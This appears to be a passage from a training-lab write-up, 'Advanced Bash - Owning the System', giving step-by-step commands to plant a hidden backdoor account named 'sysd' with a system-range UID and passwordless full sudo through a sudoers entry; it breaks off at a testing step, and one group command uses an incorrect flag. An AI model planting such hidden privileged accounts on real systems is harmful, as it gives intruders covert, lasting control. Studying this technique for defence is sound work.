# Advanced Bash - Owning the System

## Step 1: Shadow People
    1.	Create a secret user named sysd. Make sure this user doesn't have a home folder created:
                • sudo useradd sysd

    2.	Give your secret user a password:
                • sudo passwd sysd

    3.	Give your secret user a system UID < 1000:
                • sudo usermod -u 400 sysd

    4.	Give your secret user the same GID:
                • sudo groupmod -u 400 sysd

    5.	Give your secret user full sudo access without the need for a password:
                • sudo visudo

After executing the above command, you will be brought into the sudoers file to edit as seen in photo below.
![see photo](/images/picture1.png)

    Then we can add the following code in user privilege specification after root entry:
                • sysd ALL=(ALL:ALL) NOPASSWD:ALL
![see photo](/images/Picture2.png)  

    Test that sudo access works without your password: